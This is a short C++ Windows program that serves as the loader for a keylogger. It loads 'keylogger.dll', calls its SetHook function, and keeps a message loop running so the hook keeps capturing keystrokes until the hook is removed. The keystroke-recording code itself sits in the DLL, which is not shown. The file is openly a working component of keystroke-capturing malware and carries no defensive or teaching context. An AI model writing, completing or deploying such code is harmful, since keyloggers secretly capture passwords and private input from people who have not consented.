#include <iostream>
#include <string>
#include <Windows.h>

typedef void(__stdcall *pFunc)(void);

int	main(int ac, char **av)
{
	HMODULE hDll = NULL;
	pFunc ptrFunc = NULL;

	SetLastError(0);

	if ((hDll = LoadLibrary("keylogger.dll")) == NULL
		|| (ptrFunc = (pFunc)GetProcAddress(hDll, "SetHook")) == NULL)
	{
		std::cerr << GetLastError() << std::endl;
		Sleep(1000);
		return (1);
	}
	ptrFunc();

	MSG msg;
	while (GetMessage(&msg, NULL, 0, 0) > 0)
	{
		TranslateMessage(&msg);
		DispatchMessage(&msg);
	}

	if ((ptrFunc = (pFunc)GetProcAddress(hDll, "RemoveHook")) == NULL)
	{
		std::cerr << GetLastError() << std::endl;
		return (1);
	}
	ptrFunc();
	FreeLibrary(hDll);
	return (0);
}